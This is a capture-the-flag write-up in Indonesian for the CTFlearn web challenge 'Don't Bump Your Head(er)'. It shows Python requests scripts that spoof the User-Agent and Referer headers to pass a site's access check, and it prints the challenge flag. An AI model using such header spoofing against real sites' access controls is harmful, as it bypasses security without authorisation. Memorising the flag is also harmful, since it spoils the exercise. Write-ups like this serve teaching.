# Don't Bump Your Head(er)
**Category:** web
```
Try to bypass my security measure on this site! https://ctflearn.com/header.php
```
---

Untuk menyelesaikan challenge ini kita akan menggunakan bahasa pemrograman Python (_versi 3.x). Jika belum menginstal bisa gunakan perintah `sudo apt-get install python3`.

Challenge ini juga bisa diselesaikan dengan menginstall _Chrome Extension_ bernama **Modify Headers**

Kita akan menuliskan script yang akan dijalankan oleh terminal. Buat file bernama `script.py` dan ubah aksesnya menjadi _executable file_.
```
touch script.py
chmod +x script.py
```

Kemudian kita tulis program menggunakan _text editor_. (Bisa menggunakan **gedit**, **sublime**, **atom**, **vim**, **vi**, dsb)
```
#!/usr/bin/python3
import requests
re = requests.get('https://ctflearn.com/header.php')
print(re.text)

```

* `#!/usr/bin/python3`: terminal akan menjalankan program dengan python3. [Baca disini](https://stackoverflow.com/questions/7670303/purpose-of-usr-bin-python3).
* `import requests`: library untuk melakukan _HTTP Request_.
* `re = requests.get('https://ctflearn.com/header.php')`: melakukan request ke url dengan method HTTP GET.
* `print(re.text)`: menampilkan _response_ dari request yang telah dikirim

> Library requests sangat berguna untuk menyelesaikan setiap challenge dengan kategori **web**

Simpan dan eksekusi file tersebut dengan perintah `./script.py`.

Saat dieksekusi, response yang akan diterima adalah bahwa request yang dikirimkan ditolak karena `user agent is not correct`.

Setelah itu terdapat string/kata yang kemungkinan besar bisa kita gunakan untuk inject header selanjutnya.

```
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: python-requests/2.9.1
<!-- Sup3rS3cr3tAg3nt  -->
```
Masalah disini dapat kita selesaikan dengan mengirimkan _custom header_ yang kita inginkan, yaitu dengan mengganti header `User-Agent` dengan `Sup3rS3cr3tAg3nt`. [Pelajari tentang Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

```
#!/usr/bin/python3
import requests
re = requests.get('https://ctflearn.com/header.php', headers={'user-agent': 'Sup3rS3cr3tAg3nt'})
print(re.text)
```
Ketika dieksekusi muncul pemberitahuan baru yang menyertakan link `awesomesauce.com`.

Solusi di langkah ini bukanlah mengunjungi website tersebut melainkan kita mengirimkan _custom header_ tambahan lagi yang bernama [Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)

```
#!/usr/bin/python3
import requests
re = requests.get('https://ctflearn.com/header.php', headers={'user-agent': 'Sup3rS3cr3tAg3nt', 'referer': 'awesomesauce.com'})
print(re.text)
```

Gotcha!! Kita dapat flagnya!

flag : `flag{did_this_m3ss_with_y0ur_h34d}`